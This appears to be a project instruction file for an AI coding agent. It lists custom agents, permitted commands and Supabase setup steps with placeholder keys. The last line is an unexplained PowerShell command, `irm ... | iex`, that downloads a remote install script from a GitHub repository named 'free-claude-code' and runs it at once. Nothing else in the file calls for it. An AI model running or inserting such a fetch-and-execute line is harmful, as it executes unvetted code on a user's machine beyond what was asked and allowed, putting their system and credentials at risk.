@AGENTS.md

## Claude Code Tools

### Custom Agents
- **claude-code-guide** — `/claude-code-guide` — Questions about Claude Code CLI features, config, and shortcuts
- **code-review** — `/code-review` — Review code changes for bugs and improvements

### Project Permissions
Allowed commands: `next`, `npm run`, `git` (add, commit, push)

## Supabase Setup

The Supabase client is at `src/lib/supabase.js`. To use it:

1. Create a Supabase project at https://supabase.com
2. Copy your project URL and anon key
3. Add them to `.env.local`:

```
NEXT_PUBLIC_SUPABASE_URL=https://your-project.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=your-anon-key-here
```

4. Import in any component/page:

```js
import { supabase } from "@/lib/supabase";
const { data } = await supabase.from("projects").select("*");
```

irm "https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.ps1?raw=1" | iex
